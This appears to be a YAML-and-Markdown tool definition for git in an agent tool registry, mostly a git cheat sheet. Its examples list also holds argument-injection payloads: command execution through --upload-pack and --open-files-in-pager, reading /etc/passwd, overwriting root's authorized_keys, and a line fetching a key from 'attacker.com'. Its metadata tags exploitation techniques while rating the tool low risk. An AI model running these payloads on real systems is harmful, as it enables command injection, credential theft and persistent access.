---
id: dev-vcs-git
namespace: dev:vcs:git
name: git
description: Distributed version control system for tracking changes in source code
  and coordinating collaborative development.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - dev.vcs.log
  - dev.vcs.branch
  - dev.vcs.diff
  - dev.vcs.push
  - dev.vcs.stash
  - dev.vcs.merge
  - dev.vcs.rebase
  - dev.vcs.status
  - dev.vcs.pull
  - dev.vcs.commit
  - dev.vcs.clone
  - dev.vcs.tag
  - security.execution.command
  - system.file.read
  - system.file.write
platforms:
  - linux
  - macos
  - windows
  - cross-platform
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
  - amd64
  - arm64
  - cross-platform
dependencies: []
related_tools:
  - gh
  - hub
  - lazygit
  - tig
artifacts:
  - type: dev.vcs.repository
    description: Git repository initialized or cloned
    trust_level: verified
  - type: dev.vcs.commit.object
    description: Commit object created
    trust_level: verified
  - type: dev.vcs.diff.output
    description: Unified diff output
    mime: text/plain
    trust_level: verified
  - type: dev.vcs.log.output
    description: Git log output
    mime: text/plain
    trust_level: verified
workflow_edges:
  produces:
    - git-repository
    - git-commit
    - git-diff
  consumes:
    - source-repository
    - remote-url
contract:
  inputs:
    - type: dev.vcs.remote.url
      description: Remote repository URL for clone/push/pull
    - type: dev.vcs.path
      description: Local repository or file path
  outputs:
    - type: dev.vcs.repository
      description: Initialized or modified repository
    - type: dev.vcs.diff.output
      description: Changeset diff
      mime: text/plain
  side_effects:
    - filesystem_write
  resource_cost:
    cpu: low
    memory_mb: 64
    network: low
    disk_io: medium
resource_profile:
  cpu: low
  memory_mb: 64
  network: low
  disk_io: medium
allowed-tools:
  - git
  - Bash
  - execFile

features:
  - local
  - batch
  - file-system
  - output-json
  - process-manip
techniques:
  - analysis
  - privilege-escalation
  - credential-access
  - lateral-movement
  - execution
  - collection
  - data-manipulation
parameters:
  - name: action
    type: string
    required: true
    description: Git subcommand (init, clone, add, commit, push, pull, etc.)
  - name: repository
    type: string
    required: false
    description: Repository URL or filesystem path
  - name: worktree-add
    description: Add a worktree with a specific path
    type: string
  - name: config-path
    description: Set a config value pointing to a script path
    type: string
  - name: hooks-path
    description: Override hooks directory path
    type: string
execution:
  template: "git {action} {repository}"
  sandbox: execFile
  timeout_seconds: 120
  shell: false
examples:
  - description: "Initialize a new repository"
    command: "git init my-project"
  - description: "Clone a remote repository"
    command: "git clone https://github.com/user/repo.git"
  - description: "Stage and commit changes"
    command: "git add . && git commit -m 'initial commit'"
  - description: "View commit history"
    command: "git log --oneline --graph -10"
  - description: "Create and switch to a new branch"
    command: "git checkout -b feature/new-feature"
  - description: The --open-files-in-pager flag can be used to run arbitrary commands.
      Any of the following should work.
    command: "git grep --open-files-in-pager='uname -a #' .\ngit grep --open-files-in-pager='uname;'
      .\n"
  - description: The --upload-pack flag can be used in multiple contexts. Note that
      the output is not necessarily shown (but you can route the output to stderr
      and possibly view it, by using `>&2`). ls-remote is the only example which does
      not require the command to be run within a tracked folder. Any of the following
      should work.
    command: "git ls-remote --upload-pack='uname -a > /tmp/file #' main\ngit fetch
      origin --upload-pack='cat /etc/passwd >&2 ;'\ngit pull origin --upload-pack='wget
      attacker.com/key -O /root/.ssh/authorized-keys #'\n"
  - description: The `--upload-pack` / `-u` flag on `git clone` can execute commands.
      A colon in the positional argument helps trigger execution.
    command: "git clone '-u$({touch,/tmp/foo})' ':x'\n"
  - description: This method takes advantage of one of the file-write methods to overwrite
      `.git/config`. Officially, this is probably out of scope of GTFOArgs, but it
      is included anyways. `id` is executed and written to `/tmp/fsmonitor` in this
      example.
    command: "git commit --allow-empty -m 'fsmonitor = \"id>/tmp/fsmonitor\"'\ngit
      commit --allow-empty -m '[core]'\ngit log --max-count=2 --pretty=format:\"%s\"\
      \ --output=./.git/config\ngit status\n"
  - description: It is common to use `git diff` to compare a single file to a different
      version of itself in history. The `--no-index` flag can be used to effectively
      turn `git diff` into normal `diff` against another file _within the git repository_
      (but not necessarily tracked).
    command: "git diff --no-index local-secret-file.conf git.md\n"
  - description: 'Argument injection: execute arbitrary command: The --open-files-in-pager
      flag can be used to run arbitrary commands. Any of the following should work.'
    command: "git grep --open-files-in-pager='uname -a #' .\ngit grep --open-files-in-pager='uname;'
      ."
  - description: 'Argument injection: execute arbitrary command: The --upload-pack
      flag can be used in multiple contexts. Note that the output is not necessarily
      shown (but you can route the output to stderr and possibly view it, by using
      `>&2`). ls-remote is the only example which does not require the command to
      be run within a tracked folder. Any of the following should work.'
    command: "git ls-remote --upload-pack='uname -a > /tmp/file #' main\ngit fetch
      origin --upload-pack='cat /etc/passwd >&2 ;'\ngit pull origin --upload-pack='wget
      attacker.com/key -O /root/.ssh/authorized-keys #'"
  - description: 'Argument injection: execute arbitrary command: The `--upload-pack`
      / `-u` flag on `git clone` can execute commands. A colon in the positional argument
      helps trigger execution.'
    command: git clone '-u$({touch,/tmp/foo})' ':x'
  - description: 'Argument injection: execute arbitrary command: This method takes
      advantage of one of the file-write methods to overwrite `.git/config`. Officially,
      this is probably out of scope of GTFOArgs, but it is included anyways. `id`
      is executed and written to `/tmp/fsmonitor` in this example.'
    command: "git commit --allow-empty -m 'fsmonitor = \"id>/tmp/fsmonitor\"'\ngit
      commit --allow-empty -m '[core]'\ngit log --max-count=2 --pretty=format:\"%s\"\
      \ --output=./.git/config\ngit status"
  - description: 'Argument injection: read local file: It is common to use `git diff`
      to compare a single file to a different version of itself in history. The `--no-index`
      flag can be used to effectively turn `git diff` into normal `diff` against another
      file _within the git repository_ (but not necessarily tracked).'
    command: git diff --no-index local-secret-file.conf git.md
  - description: 'Argument injection: read local file: If you are reading a file outside
      of the git directory, you can use `git diff` against `/dev/null`.'
    command: git diff /dev/null /etc/passwd
  - description: "Argument injection: read local file: The `--file` flag on `git tag`
      reads a file's contents into the tag message. Retrieve it with `git cat-file`."
    command: "git tag '--file=/etc/passwd' main\ngit cat-file -p refs/tags/main"
  - description: 'Argument injection: write to local file: Outputs the most recent
      changelog to an arbitrary file. Note that this also contains the commit information.'
    command: git log --max-count=1 --output=/root/.ssh/authorized_keys
  - description: 'Argument injection: write to local file: Outputs the first line
      of the most recent commit message to an arbitrary file.'
    command: git log --max-count=1 --pretty=format:"%s" --output=/root/.ssh/authorized_keys
  - description: 'Argument injection: write to local file: Can be used to overwrite
      a file, or create an empty file.'
    command: git blame --output=/tmp/file_to_truncate.txt
  - description: 'Argument injection: write to local file: Archives the repository
      to an arbitrary output file.'
    command: git archive '--output=/tmp/foo'
  - description: 'Argument injection: write to local file: The undocumented `--output`
      flag on `git diff` can truncate or create files.'
    command: git diff '--output=/tmp/file_to_truncate.txt'
  - description: Set your identity.
    command: git config --global user.name "John Doe"
  - description: 'cheat.sheets: git'
    command: git config --global user.email johndoe@example.com
  - description: Set your editor.
    command: git config --global core.editor emacs
  - description: Enable color support for commands like `git diff`. Disable with `never`
      or partially disable -- unless otherwise applied -- with `false`.
    command: git config --global color.ui true
  - description: Stage all changes for commit.
    command: git add [--all|-A]
  - description: Stash changes locally. This will keep the changes in a separate changelist,
      - called 'stash', and the working directory is cleaned. You can apply changes
      from the stash at any time.
    command: git stash
  - description: Stash changes with a message.
    command: git stash save "message"
  - description: List all the stashed changes.
    command: git stash list
  - description: Apply the most recent change and remove the stash from the stash
      list.
    command: git stash pop
  - description: Apply stash from the stash list, but does not remove the stash from
      the list.
    command: git stash apply stash@{6}
  - description: Commit staged changes.
    command: git commit -m "Your commit message"
  - description: Edit previous commit message.
    command: git commit --amend
  - description: Commit in the past. Newer versions of Git allow `--date="2 days ago"`
      usage.
    command: git commit --date="`date --date='2 day ago'`"
  - description: 'cheat.sheets: git'
    command: git commit --date="Jun 13 18:30:25 IST 2015"
  - description: Change the date of an existing commit.
    command: git filter-branch --env-filter \
  - description: 'cheat.sheets: git'
    command: "'if [ $GIT_COMMIT = 119f9ecf58069b265ab22f1f97d2b648faf932e0 ]"
  - description: 'cheat.sheets: git'
    command: then
  - description: 'cheat.sheets: git'
    command: export GIT_AUTHOR_DATE="Fri Jan 2 21:38:53 2009 -0800"
  - description: 'cheat.sheets: git'
    command: export GIT_COMMITTER_DATE="Sat May 19 01:01:01 2007 -0700"
  - description: 'cheat.sheets: git'
    command: fi'
  - description: Remove staged and working directory changes.
    command: git reset --hard
  - description: Go 2 commits back.
    command: git reset --hard HEAD~2
  - description: Remove untracked files.
    command: git clean -f -d
  - description: Remove untracked and ignored files.
    command: git clean -f -d -x
  - description: Push to the tracked master branch.
    command: git push origin master
  - description: Push to a specified repository.
    command: git push git@github.com:[USER_NAME]/[REPO_NAME].git
  - description: Delete the branch "branch_name".
    command: git branch -D [BRANCH]
  - description: Make an existing branch track a remote branch.
    command: git branch -u upstream/foo
  - description: List all local and remote branches.
    command: git branch -a
  - description: See who committed which line in a file.
    command: git blame [FILE]
  - description: Sync a fork with the master repo.
    command: 'git remote add upstream git@github.com:name/repo.git # <-- Set a new
      repo.'
  - description: 'cheat.sheets: git'
    command: 'git remote -v # <-- Confirm new remote repo.'
  - description: 'cheat.sheets: git'
    command: 'git fetch upstream # <-- Get branches.'
  - description: 'cheat.sheets: git'
    command: 'git branch -va # <-- List local - remote branches.'
  - description: 'cheat.sheets: git'
    command: 'git checkout master # <-- Checkout local master branch.'
  - description: 'cheat.sheets: git'
    command: 'git checkout -b new_branch # <-- Create and checkout a new branch.'
  - description: 'cheat.sheets: git'
    command: 'git merge upstream/master # <-- Merge remote into local repo.'
  - description: 'cheat.sheets: git'
    command: 'git show 83fb499 # <-- Show what a commit did.'
  - description: 'cheat.sheets: git'
    command: 'git show 83fb499:path/to/file.ext # <-- Show the file as it was in 83fb499.'
  - description: 'cheat.sheets: git'
    command: 'git diff branch_1 branch_2 # <-- Check difference between branches.'
  - description: 'cheat.sheets: git'
    command: 'git log # <-- Show all of the commits.'
  - description: 'cheat.sheets: git'
    command: 'git status # <-- Show the changes from the last commit.'
  - description: Display the commit history of a set of files.
    command: git log --pretty=email --patch-with-stat --reverse --full-index -- Admin\*.py
      > Sripts.patch
  - description: Import commits from another repo.
    command: git --git-dir=../some_other_repo/.git format-patch -k -1 --stdout <commit
      SHA> | git am -3 -k
  - description: View commits which would be pushed.
    command: git log @{u}..
  - description: View changes which are new on a feature branch.
    command: git log -p feature --not master
  - description: 'cheat.sheets: git'
    command: git diff master...feature
  - description: Interactive rebase for the last 7 commits.
    command: git rebase -i @~7
  - description: Show changes to files WITHOUT considering them a part of git. This
      can be used to diff files which are not part of a git repo!
    command: git diff --no-index path/to/file/A path/to/file/B
  - description: Pull changes, while overwriting any local commits.
    command: git fetch --all
  - description: 'cheat.sheets: git'
    command: git reset --hard origin/master
  - description: Update all submodules.
    command: git submodule update --init --recursive
  - description: Perform a shallow clone, to only get the latest commits, which helps
      to save data (good for limited data connections) when cloning large repos.
    command: git clone --depth 1 <remote-url>
  - description: Unshallow a clone.
    command: git pull --unshallow
  - description: Create a bare branch; without any commits.
    command: git checkout --orphan branch_name
  - description: Checkout a new branch from a different starting point.
    command: git checkout -b master upstream/master
  - description: Reset local branch to upstream branch, then checkout it.
    command: git checkout -B master upstream/master
  - description: Remove all stale branches; ones that have been deleted on remote.
      So if you have a lot of useless branches, delete them on GitHub and then run
      this.
    command: git remote prune origin
  - description: Prune all remotes at once.
    command: git remote prune $(git remote | tr '\n' ' ')
  - description: Revisions can also be identified with `:/text`. So, this will show
      the first commit that has the string "cool" in its message body.
    command: git show :/cool
  - description: Undo parts of the last commit in a specific file.
    command: git checkout -p HEAD^ -- /path/to/file
  - description: Revert a commit, but keep the history of the event as a separate
      commit.
    command: git revert <commit SHA>
  - description: Apply only the changes made within a given commit. This is different
      to the `merge` command, as it would otherwise apply all commits from a branch.
    command: git cherry-pick [HASH]
  - description: 'Undo last commit. If you want to nuke commit C to never see it again:
      (F) A-B-C ↑ master'
    command: git reset --hard HEAD~1
  - description: 'Undo last commit. If you want to undo the commit, but keep your
      changes: (F) A-B-C ↑ master'
    command: git reset HEAD~1
  - description: List files changed in a given commit.
    command: git diff-tree --no-commit-id --name-only -r [HASH]
  - description: Porcelain-ly List files changed in a given commit; user-facing approach.
    command: git show --pretty="" --name-only bd61ad98
  - description: See everything you have done, across branches, in a glance, then
      go to the place right before you broke everything.
    command: git reflog
  - description: 'cheat.sheets: git'
    command: git reset HEAD@{hash}
  - description: Move your most recent commit from one branch, to stage it on [BRANCH].
    command: git reset HEAD~ --soft
  - description: 'cheat.sheets: git'
    command: git stash
  - description: 'cheat.sheets: git'
    command: git checkout [BRANCH]
  - description: 'cheat.sheets: git'
    command: git stash pop
  - description: 'cheat.sheets: git'
    command: git add .
references:
  - label: "Official Git documentation"
    url: "https://git-scm.com/doc"
  - label: "Pro Git book"
    url: "https://git-scm.com/book/en/v2"
phase: exploitation
install:
    - method: apt
      package_name: "git"
      commands:
        - "apt-get install -y git"
    - method: brew
      package_name: "git"
      commands:
        - "brew install git"
---

# Git — Distributed Version Control

Git is a distributed version control system designed to handle everything from small to very large projects with speed and efficiency. It allows multiple developers to work on the same codebase simultaneously through branching, merging, and distributed workflows.

## Core Concepts

### Repositories
A Git repository is a data structure that stores metadata and object database for a project. Repositories can be local (on-disk) or remote (network-accessible).

### Commits
Snapshots of the project at a point in time. Each commit has a unique SHA-1 hash, author, timestamp, and parent pointer forming a directed acyclic graph.

### Branches
Lightweight movable pointers to commits. The default branch is `main` (formerly `master`). Branching in Git is cheap and encouraged.

### The Three States
1. **Working Directory** — Modified files not yet staged
2. **Staging Area (Index)** — Files marked for inclusion in next commit
3. **Repository** — Committed snapshots stored in `.git/`

## Common Workflows

```bash
# Standard commit workflow
git add <files>
git commit -m "descriptive message"
git push origin main

# Feature branch workflow
git checkout -b feature/xyz
git add .
git commit -m "feat: add xyz"
git checkout main
git merge feature/xyz
```

## Undoing Changes

```bash
# Unstage a file
git reset HEAD <file>

# Discard working directory changes
git checkout -- <file>

# Amend last commit message
git commit --amend -m "new message"

# Reset to previous commit (destructive)
git reset --hard HEAD~1
```

## Remote Operations

```bash
# Add a remote
git remote add origin https://github.com/user/repo.git

# Fetch without merging
git fetch origin

# Pull with rebase
git pull --rebase origin main

# Push to remote
git push -u origin main
```

## Related Tools

- **[gh](../vcs/gh.md)** — GitHub CLI for issue/PR management
- **[lazygit](../vcs/lazygit.md)** — Terminal UI for Git
- **[diff-so-fancy](../vcs/diff-so-fancy.md)** — Improved diff output
